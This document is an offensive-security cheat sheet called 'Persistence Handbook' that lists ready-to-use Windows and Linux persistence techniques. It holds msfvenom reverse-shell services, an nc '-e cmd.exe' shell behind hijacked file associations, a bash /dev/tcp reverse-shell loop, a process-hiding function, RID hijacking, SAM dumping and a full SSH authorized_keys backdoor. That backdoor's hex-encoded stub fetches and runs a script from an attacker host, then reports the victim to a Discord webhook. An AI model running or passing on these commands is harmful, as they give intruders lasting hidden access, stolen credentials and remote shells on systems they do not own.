# Persistence Handbook

## Table of Contents

- [Alternate Data Stream Files (ADS)](#alternate-data-stream-files-ads)
- [Backdoor Services](#backdoor-services)
- [Bash Backdoor](#bash-backdoor)
- [COM Hijacking](#com-hijacking)
- [Hijack File Associations](#hijacking-file-associations)
- [InprocServer32 Persistence](#inprocserver32-persistence)
- [Logon Triggered Persistence](#logon-triggered-persistence)
- [Normal.dotm](#normaldotm)
- [Quick Persistence](#quick-persistence)
- [Registry Writes Without Registry Callbacks](#registry-writes-without-registry-callbacks)
- [Relative ID (RID) Hijacking](#relative-id-rid-hjacking)
- [Security Descriptor Modification](#security-descriptor-modification)
- [Special Privileges and Security Descriptors](#special-privileges-and-security-descriptors)
- [SSH Public Key Backdoor](#ssh-public-key-backdoor)
- [Task Scheduler](#task-scheduler)
- [User Group Manipulation](#user-group-manipulation)

## Alternate Data Stream Files (ADS)

### Set Content

```cmd
C:\> echo <PAYLOAD> > %USERPROFILE%\AppData:<FILE>
C:\> type C:\Windows\System32\calc.exe > <FILE>:Calculator
PS C:\> Write-Output '<CONTENT>' | Set-Content .\<FILE> -Stream '<NAME>'
```

<p align="center">
  <img src="https://github.com/0xsyr0/Awesome-Security-Handbooks/blob/master/images/ads1.png">
</p>

### Listing ADS Files & Read File Content

```cmd
C:\> dir /r
C:\> dir /r /a
C:\> dir /r /a %USERPROFILE%\AppData\
PS C:\> Get-Content .\<FILE> -Stream <MAME>
PS C:\> Get-Content .\<FILE> -Stream ':DATA'
PS C:\> Get-Item * -Stream *
PS C:\> Get-Item .\<FILE> -Stream *
```

### Execute File Content Examples

> https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f

```cmd
C:\> forfiles /p C:\Windows\System32 /m notepad.exe /c "C:\Windows\Tasks\<FILE>:Calculator"
```

```cmd
PS C:\> sc.exe <SERVICE> binPath= "C:\Calculator" DisplayName= "<SERVICE>" start= auto error= ignore
PS C:\> sc.exe start <SERVICE>
```

### ALPHV Ransomware Example

> https://www.crowdstrike.com/blog/anatomy-of-alpha-spider-ransomware/

```cmd
powershell -command " & {(Get-Content C:\System -Raw | Set-Content C:\ -Stream 'Host Process for Windows Service')}"
sc.exe create ssh-server binPath="C:\:Host Process for Windows Service -b 1074 <LHOST>" DisplayName= "OpenSSH Authentication Server" start= auto error= ignore
net start ssh-server
del C:\System
```

### Deleting ADS Files

> https://live.sysinternals.com/

```cmd
C:\> .\streams64.exe -s C:\PATH\TO\FOLDER\
C:\> .\streams64.exe -d C:\PATH\TO\FOLDER\
```

<p align="center">
  <img src="https://github.com/0xsyr0/Awesome-Security-Handbooks/blob/master/images/ads2.png">
</p>

## Backdoor Services

### User Password Reset

Reset a users `password`.

```cmd
C:\> sc.exe create <SERVICE_NAME> binPath= "net user <USERNAME> <PASSWORD>" start= auto
C:\> sc.exe start <SERVICE_NAME>
```

### Reverse Shell Services

Create a `reverse shell` to be triggert by the service.

```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe-service -o <FILE>.exe
```

```cmd
C:\> sc create <SERVICE_NAME> binPath= "C:\Windows\<FILE>.exe" start= auto
```

```cmd
C:\> sc start <SERVICE_NAME>
```

### Modifying existing services.

```console
$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f exe-service -o <FILE>.exe
```

```cmd
C:\> sc query state=all
```

```cmd
C:\> sc config <SERVICE_NAME> binPath= "C:\Windows\<FILE>.exe" start= auto obj= "LocalSystem"
```

```cmd
C:\> sc qc <SERVICE_NAME>
```

```cmd
C:\> sc start <SERVICE_NAME>
```

## Bash Backdoor

This is an old Linux trick executed in `Bash` that simply `over-mounts` a particular `PID` in `/proc` with a useless, empty directory, so that `/proc/<PID>` doesn't get populated with the usual process information (invisible to the `ps` command, for example).
Requires `root` permissions; either execute it in your shell or slap it into `/root/.bashrc`.

Thanks to Alh4zr3d and THC for sharing!

```console
hide()
{
[[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv /etc/mtab.bak /etc/mtab; }
_pid=${1:-$$}
[[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && echo "[Backdoor] PID $_pid is now hidden"; return; }
local _argstr
for _x in "${@:2}"; do _argstr+=" '${_x//\'/\'\"\'\"\'}'"; done
[[ $(bash -c "ps -o stat= -p \$\$") =~ \+ ]] || exec bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
bash -c "mount -n --bind /dev/shm /proc/\$\$; exec \"$1\" $_argstr"
}
```

### Examples

- Hide the current shell/PID: `hide`
- Hide process with pid 31337: `hide 31337`
- Hide `sleep 1234`: hide sleep 1234
- Start and hide `sleep 1234` as a background process: `hide nohup sleep 1234 &>/dev/null &`

## COM Hijacking

### Find COM Entries with Process Monitor

- The operation is `RegOpenKey`
- The path ends with `InprocServer32`
- The result is `NAME NOT FOUND`

### Verify that Key exists in HKLM and not in HKCU

```cmd
PS C:\> Get-Item -Path "HKLM:\Software\Classes\CLSID\{A5EBA07A-DAE8-4D15-B12F-728EFD8A9866}\InprocServer32"

    Hive: HKEY_LOCAL_MACHINE\Software\Classes\CLSID\{A5EBA07A-DAE8-4D15-B12F-728EFD8A9866}

Name                           Property
----                           --------
InprocServer32                 (default)      : C:\Windows\system32\mssprxy.dll
                               ThreadingModel : Both
```

```cmd
PS C:\> Get-Item -Path "HKCU:\Software\Classes\CLSID\{A5EBA07A-DAE8-4D15-B12F-728EFD8A9866}\InprocServer32"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{A5EBA07A-DAE8-4D15-B12F-728EFD8A9866}\InprocServer32'
because it does not exist.
```

### Exploiting missing CLSIDs

```cmd
PS C:\> New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{A5EBA07A-DAE8-4D15-B12F-728EFD8A9866}"
```

```cmd
PS C:\> New-Item -Path "HKCU:Software\Classes\CLSID\{A5EBA07A-DAE8-4D15-B12F-728EFD8A9866}" -Name "InprocServer32" -Value "C:\temp\<FILE>.dll"
```

```cmd
PS C:\> New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{A5EBA07A-DAE8-4D15-B12F-728EFD8A9866}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

## Hijacking File Associations

Registry Path.

```console
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\
```

Now search for the desired `file extention` and change the `Programmatic ID (ProgID)`.

```console
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command
```

Then build a `PowerShell Script` and place it anywhere on the target.

```cmd
Start-Process -NoNewWindow "C:\temp\nc64.exe" "-e cmd.exe <LHOST> <LPORT>"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

Next change the `Registry Key` to point to the script.

```console
powershell -windowstyle hidden C:\Windows\System32\<FILE>.ps1 %1
```

## InprocServer32 Persistence

```cmd
C:\> reg add "HKCU\Software\Classes\CLSID\{18907f3b-9afb-4f87-b764-f9a4e16a21b8}\InprocServer32" /ve /t REG_SZ /d "C:\PATH\TO\FILE\<FILE>.dll" /f
```

```cmd
PS C:\> Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{18907f3b-9afb-4f87-b764-f9a4e16a21b8}\InprocServer32" -Name "(default)" -Value "C:\PATH\TO\FILE\<FILE>.dll"
```

```cmd
PS C:\> New-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{18907f3b-9afb-4f87-b764-f9a4e16a21b8}\InprocServer32" -Name "(default)" -Value "C:\PATH\TO\FILE\<FILE>.dll" -PropertyType String -Force
```

## Logon Triggered Persistence

### Execute after Logon

Base path for `executables` which should run on `user login`.

```console
C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
```

The path for all users it is the following one.

```console
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

### Run / RunOnce

Execution on logon can also be achieved via `registry key`.

- HKLM\Software\Microsoft\Windows\CurrentVersion\Run
- HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
- HKCU\Software\Microsoft\Windows\CurrentVersion\Run
- HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

Creating a new `REG_EXPAND_SZ` entry with a path to the file which should be executed after loggin in, will do the job.

#### Examples

```cmd
C:\> reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v <NAME> /t REG_SZ /d "\"C:\temp\<FILE>"\"
```

- `/v` is the name of the registry value.
- `/t` is the type of data the value will hold.
- `/d` is the data for the entry.

```cmd
PS C:\> New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name <NAME> -PropertyType String -Value '"C:\temp\<FILE>"'
```

- `-PropertyType` of String is equivalent to REG_SZ.

### Abusing Winlogon

An alternative would be using the `Windows component` which is loading the `user profile`.

```console
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

Code execution can be achived by `appending` commands to either `Shell` or `Userinit` entries.

```console
C:\Windows\System32\userinit.exe, C:\Windows\<FILE>
```

### Abusing Logon Scripts

When `userinit.exe` is loading the `user profile`, it also checks a `environment variable` called `UserInitMprLogonScript`.

The variable is `not set` by `default`, which means it can be created and pointed to a file which should be executed.

```console
HKEY_CURRENT_USER\Environment
```

Create an new `REG_EXPAND_SZ` entry, named as `UserInitMprLogonScript` and the path to the malicious file.

## Normal.dotm

Add a macro to the `Normal.dotm` which get's executed whenever `any` document is opened.

## Registry Writes Without Registry Callbacks

> https://deceptiq.com/blog/ntuser-man-registry-persistence

> https://github.com/praetorian-inc/swarmer

```cmd
C:\> reg export HKCU C:\Windows\Tasks\<FILE>.reg /reg:64
```

> https://persistence-info.github.io/

```console
[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run]
"OneDrive"="\"C:\\Users\\<USERNAME>\\Appdata\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background"
"<FILE>"="C:\PATH\TO\FILE\<FILE>.exe"
```

> https://github.com/stormshield/HiveSwarming

```cmd
C:\> .\HiveSwarming.exe --from reg --to hive <FILE>.reg NTUSER.MAN
```

## Quick Persistence

```console
$ `while :; do setsid bash -i &>/dev/tcp/<LHOST>/<LPORT> 0>&1; sleep 120; done &>/dev/null &`
```

## Relative ID (RID) Hijacking

Get the current `RIDs`.

```cmd
PS C:\> wmic useraccount get name,sid
```

```console
Name                SID
Administrator       S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
Guest               S-1-5-21-1966530601-3185510712-10604624-501
```

Edit the `registry` by using `PsExec64.exe` to add the `RID` of `500`, which is a `Local Administrator` to another user.

```cmd
PS C:\> PsExec64.exe -i -s regedit
```

Path in Registry.

```console
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\
```

Under the corresponding key, there will be a vlaue called `F`, which holds the user's effective `RID`. Those are stored
by using `little-endian` notation, so the bytes appear `reversed`.

```console
500 = 0x01F4
```

Switched Bytes.

```console
F401
```

Save it and on the next login, the user should get `RID 500` assigned.

## Task Scheduler

```cmd
PS C:\> schtasks /create /SC DAILY /ST 09:00 /TN "<TASK>" /TR "C:\temp\<FILE>"
```

- `/SC` is the schedule frequency.
- `/ST` is the start time.
- `/TN` is the task name.
- `/TR` is the path of the program to run.

```cmd
PS C:\> $action = New-ScheduledTaskAction -Execute "C:\temp\<FILE>"
PS C:\> $trigger = New-ScheduledTaskTrigger -Daily -At 09:00
PS C:\> $task = New-ScheduledTask -Action $action -Trigger $trigger
PS C:\> Register-ScheduledTask "<TASK>" -InputObject $task
```

### Hide malicious Tasks

Open the follwing path in the registry.

```console
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
```

Then delete the `security descriptor` for the task.

## Security Descriptor Modification

### Service Control Manager

```cmd
C:\> sc.exe sdset scmanager D:(A;;CCDC;;;WD)
```

## Special Privileges and Security Descriptors

### Edit Special Privileges

Add `SeBackupPrivilege` and `SeRestore Privilege` to a user.

Export the configuration file.

```cmd
PS C:\> secedit /export /cfg config.inf
```

Edit the file and add the `username`.

```console
SeBackupPrivilege = *S-1-5-32-544,*S-1-5-32-551,<USERNAME>
SeRestorePrivilege = *S-1-5-32-544,*S-1-5-32-551,<USERNAME>
```

Convert the `.inf` file into a `.sdb` file and load the configuration back into the system.

```cmd
PS C:\> secedit /import /cfg config.inf /db config.sdb
PS C:\> secedit /configure /db config.sdb /cfg config.inf
```

### Enable WinRM Security Descriptor

Open the `permission window` and add a user, which should granted `Full Control` in order to `remote login`.

```cmd
PS C:\> Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

## SSH Public Key Backdoor

The code and examples for this `backdoor` are from the following sources.

> https://blog.thc.org/infecting-ssh-public-keys-with-backdoors

> https://github.com/hackerschoice/ssh-key-backdoor

The `backdoor.sh` script generates the payload you need to create the malicious `authorized_keys` and `id_rsa.pub` files.
Please notice that this backdoor requires `root privileges`.

### backdoor.sh

```console
#! /bin/bash

# Create a BACKDOOR-STUB for ~/.ssh/authorized_keys or ~/.ssh/id_rsa.pub

if [[ -t 1 ]]; then
    CDR="\\033[0;31m" # red
    CDY="\\033[0;33m" # yellow
    CY="\\033[1;33m" # yellow
    CDM="\\033[0;35m" # magenta
    CM="\\033[1;35m" # magenta
    CDC="\\033[0;36m" # cyan
    CN="\\033[0m"    # none
    out(){ echo "$@";}
else
    out(){ :;}
fi

# This stub is encoded for the ssh-key 'command='.
stubs(){ ###___STUBS___
    # - Check if /bin/sh and .ssh have the same date. We set it to the _same_ date
    #   to mark that the backdoor has been installed.
    # Note: Do not remove the ':' at the end of the first and last line.
    [[ $(stat -c%Y /bin/sh) != $(stat -c%Y .ssh) ]] && { :
        touch -r /bin/sh .ssh
        ###-----BEGIN BACKDOOR-----
        # Anything from here until -----END BACKDOOR----- will
        # be executed once when the user logs in. All output goes
        # to stderr.
        #
        # In our DEMO example we request a backdoor script
        # from thc.org/sshx. PLEASE CHANGE THIS.
        # 
        # Note from syro: I already changed the point above
        # and changed it to backdoor_staged.sh.
        #
        # Set a DISCORD KEY:
        export KEY="%%KEY%%"
        # Request and execute sshx (which will install gs-netcat and
        # report the result back to our DISCORD channel)
        bash -c "$(curl -fsSL <LHOST>/backdoor_staged.sh)" || bash -c "$(wget --no-verbose -O- <LHOST>/backdoor_staged.sh)" || exit 0
        ###-----END BACKDOOR-----
    } >/dev/null 2>/dev/null & :
    [[ -n $SSH_ORIGINAL_COMMAND ]] && exec $SSH_ORIGINAL_COMMAND
    [[ -z $SHELL ]] && SHELL=/bin/bash
    [[ -f /run/motd.dynamic ]] && cat /run/motd.dynamic
    [[ -f /etc/motd ]] && cat /etc/motd
    exec -a -$(basename $SHELL) $SHELL
} ###___STUBS___

# Read my own script and extract the above stub into a variable.
get_stubs()
{
    local IFS
    IFS=""
    STUB="$(<"$0")"
    STUB="${STUB#*___STUBS___}"
    STUB="${STUB%%\} \#\#\#___STUBS___*}"
}

get_stubs
cmd=$(echo "$STUB" | sed 's/^[[:blank:]]*//' | sed '/^$/d' | sed '/^#/d' | tr '\n' ';' | sed "s|%%KEY%%|${KEY}|")

if [[ $1 == clear ]]; then
    cmd=${cmd//\"/\\\"}
else
    bd=$(echo "$cmd" | xxd -ps -c2048)
    cmd="eval \$(echo $bd|xxd -r -ps);"
fi

[[ -z $KEY ]] && out -e "=========================================================================
${CDR}WARNING${CN}: The default reports to THC's Discord channel.
Set your own DISCORD WEBHOOK KEY:
    ${CDC}KEY=\"<API_KEY>\" $0${CN}
========================================================================="

out -e "${CDY}Prepend this to every line in ${CY}~/.ssh/authorized_keys${CDY}
and ${CY}~/.ssh/id_rsa.pub${CDY} so that it looks like this${CN}:"
echo -en "${CM}no-user-rc,no-X11-forwarding,command=\"${CDM}\`###---POWERSHELL---\`;${cmd}${CM}\"${CN}"
# echo -en "${CM}command=${CM}\"${CDM}\`###---POWERSHELL---\`;bash -c '{ ${cmd}}'${CM}\"${CN}"
out " ssh-ed25519 AAAAC3Nzblah...."
```

The `backdoor_staged.sh` script then installs the actual backdoor which utilizes `Global Socket` aka `gsocket`.

> https://www.gsocket.io/

### backdoor_staged.sh

```console
#! /bin/bash

# This is an example script to demonstrate how ssh keys can be used to
# as a permanent backdoor and to move laterally through a network.
#
# If you find this on your network then somebody tested our tool and
# forgot to change the script's URL. Contact us at root@proton.thc.org.


# Discord API key
# This key can be changed HERE or you can set  your own key with
# KEY=<YOUR DISCORD WEBHOOK KEY> ./gen
[[ -z $KEY ]] && KEY="<API_KEY>"

# Install GS-NETCAT and report installation back to DISCORD.
command -v curl >/dev/null && IS_CURL=1 || command -v wget >/dev/null && IS_WGET=1 || exit 0
if [[ -n $IS_CURL ]]; then
    S="$(bash -c "$(curl -fsSL gsocket.io/x)")"
else
    S="$(bash -c "$(wget --no-verbose -O- gsocket.io/x)")"
fi
S=${S##*S=\"}
S=${S%%\"*}
X=($(hostname; uname -mrs))
MSG="${USER} ${X[*]} -- gs-netcat -i -s${S:-BAD}"

DATA='{"username": "sshx", "content": "'"$MSG"'"}'
if [[ -n $IS_CURL ]]; then
    curl -H "Content-Type: application/json" -d "${DATA}" "https://discord.com/api/webhooks/${KEY}"
else
    wget -q -O- --header="Content-Type: application/json" --post-data="${DATA}" "https://discord.com/api/webhooks/${KEY}"
fi
exit 0
```

Now modify the `authorized_keys` file and all `SSH Public Key` files

### authorized_keys Example

```console
root@linux:~/.ssh# cat authorized_keys 
no-user-rc,no-X11-forwarding,command="`###---POWERSHELL---`;eval $(echo 5b5b20242873746174202d632559202f62696e2f73682920213d20242873746174202d632559202e73736829205d5d202626207b203a3b746f756368202d72202f62696e2f7368202e7373683b6578706f7274204b45593d22223b62617368202d63202224286375726c202d6673534c203c4c484f53543e2f6261636b646f6f725f7374616765642e73682922207c7c2062617368202d632022242877676574202d2d6e6f2d766572626f7365202d4f2d203c4c484f53543e2f6261636b646f6f725f7374616765642e73682922207c7c206578697420303b7d203e2f6465762f6e756c6c20323e2f6465762f6e756c6c2026203a3b5b5b202d6e20245353485f4f524947494e414c5f434f4d4d414e44205d5d202626206578656320245353485f4f524947494e414c5f434f4d4d414e443b5b5b202d7a20245348454c4c205d5d202626205348454c4c3d2f62696e2f626173683b5b5b202d66202f72756e2f6d6f74642e64796e616d6963205d5d20262620636174202f72756e2f6d6f74642e64796e616d69633b5b5b202d66202f6574632f6d6f7464205d5d20262620636174202f6574632f6d6f74643b65786563202d61202d2428626173656e616d6520245348454c4c2920245348454c4c3b0a|xxd -r -ps);" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDV6DHQk2GlkZeK3N2BmRStFWElTU481DY5BAWJWJhmWAzhaWYzw4pfja21ldJv5veg7I8j1Txh8yLNqbBtfXXFLBrhjEQHovF0EZOO18IDmoTpKOyveblUVZ7wZrQuRE+a0fuQPPJHR+5wj++lps7si9W4x+Ht3LJezUPiKrRuncxzophpfDrmUmnw3fKOcyEf2LIAYkU28ro8YRKddN2w7z6wgy0AE46TIgP+moBom/O8OoJEvla8sUCjJ/yPMrN2paELkJTNv7Sy+A4fKhf91rHPYWOGwSkPWVW13k0FcYoGeEsof9FjCwn+WYWFtRbigXvhiaMGN/oyzQG2h0kjWh/7SeRKOjZ2b7aj9FG7jP0RoD9UltlfE0sERBDRsxHfwaQsbooc/FmtfsKrcz+dFS/X4ox8iwYvwRc9maS4qhtP8BAx4B1CWltpi9tJf+NV3yPMsSitdh/YXSpa2n2z7TLjxz5mR34bIbC5KzntSHgqcXyozppaXO+OW2+X50k2Ra+He0iH2gQSO42F2wxxmAfKeyBkeS6iDXJ79oV0Z48ec292oRUCbx27oaGRqa0pMymp1PFhoJbTgLix9fs0bXnuD6HLwoGlKloKWOrF8pY7dKq2lgec2iGMbIgO7w4sozYUznmdQabUvFcUt2mBEERKY3Ih7MQUaN8vz9kShQ== user@linux
```

### id_rsa.pub Example

```console
root@linux:~/.ssh# cat id_rsa.pub 
no-user-rc,no-X11-forwarding,command="`###---POWERSHELL---`;eval $(echo 5b5b20242873746174202d632559202f62696e2f73682920213d20242873746174202d632559202e73736829205d5d202626207b203a3b746f756368202d72202f62696e2f7368202e7373683b6578706f7274204b45593d22223b62617368202d63202224286375726c202d6673534c203c4c484f53543e2f6261636b646f6f725f7374616765642e73682922207c7c2062617368202d632022242877676574202d2d6e6f2d766572626f7365202d4f2d203c4c484f53543e2f6261636b646f6f725f7374616765642e73682922207c7c206578697420303b7d203e2f6465762f6e756c6c20323e2f6465762f6e756c6c2026203a3b5b5b202d6e20245353485f4f524947494e414c5f434f4d4d414e44205d5d202626206578656320245353485f4f524947494e414c5f434f4d4d414e443b5b5b202d7a20245348454c4c205d5d202626205348454c4c3d2f62696e2f626173683b5b5b202d66202f72756e2f6d6f74642e64796e616d6963205d5d20262620636174202f72756e2f6d6f74642e64796e616d69633b5b5b202d66202f6574632f6d6f7464205d5d20262620636174202f6574632f6d6f74643b65786563202d61202d2428626173656e616d6520245348454c4c2920245348454c4c3b0a|xxd -r -ps);" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDV6DHQk2GlkZeK3N2BmRStFWElTU481DY5BAWJWJhmWAzhaWYzw4pfja21ldJv5veg7I8j1Txh8yLNqbBtfXXFLBrhjEQHovF0EZOO18IDmoTpKOyveblUVZ7wZrQuRE+a0fuQPPJHR+5wj++lps7si9W4x+Ht3LJezUPiKrRuncxzophpfDrmUmnw3fKOcyEf2LIAYkU28ro8YRKddN2w7z6wgy0AE46TIgP+moBom/O8OoJEvla8sUCjJ/yPMrN2paELkJTNv7Sy+A4fKhf91rHPYWOGwSkPWVW13k0FcYoGeEsof9FjCwn+WYWFtRbigXvhiaMGN/oyzQG2h0kjWh/7SeRKOjZ2b7aj9FG7jP0RoD9UltlfE0sERBDRsxHfwaQsbooc/FmtfsKrcz+dFS/X4ox8iwYvwRc9maS4qhtP8BAx4B1CWltpi9tJf+NV3yPMsSitdh/YXSpa2n2z7TLjxz5mR34bIbC5KzntSHgqcXyozppaXO+OW2+X50k2Ra+He0iH2gQSO42F2wxxmAfKeyBkeS6iDXJ79oV0Z48ec292oRUCbx27oaGRqa0pMymp1PFhoJbTgLix9fs0bXnuD6HLwoGlKloKWOrF8pY7dKq2lgec2iGMbIgO7w4sozYUznmdQabUvFcUt2mBEERKY3Ih7MQUaN8vz9kShQ== user@linux
```

### Access the Backdoor

```console
$ gs-netcat -i -s3oZLTBoTv7CFkem4EMDRwb
=Secret         : s3oZLTBoTv7CFkem4EMDRwb
=Encryption     : SRP-AES-256-CBC-SHA-End2End (Prime: 4096 bits)
root@linux:~#
```

## User Group Manipulation

Add user to `Local Administrators` group.

```cmd
PS C:\> net localgroup administrators <USERNAME> /add
```

Add user to `Backup Operators` group.

```cmd
PS C:\> net localgroup "Backup Operators" <USERNAME> /add
```

Add user to `Remote Desktop Users` group.

```cmd
PS C:\> net localgroup "Remote Management Users" <USERNAME> /add
```

Disable `LocalAccountTokenFilterPolicy`.

```cmd
PS C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

Dumping `SAM` and `SYSTEM` files with `Backup Operator` privileges.

```cmd
PS C:\> reg save hklm\system system.bak
```

```cmd
PS C:\> reg save hklm\sam sam.bak
```

```cmd
$ impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```
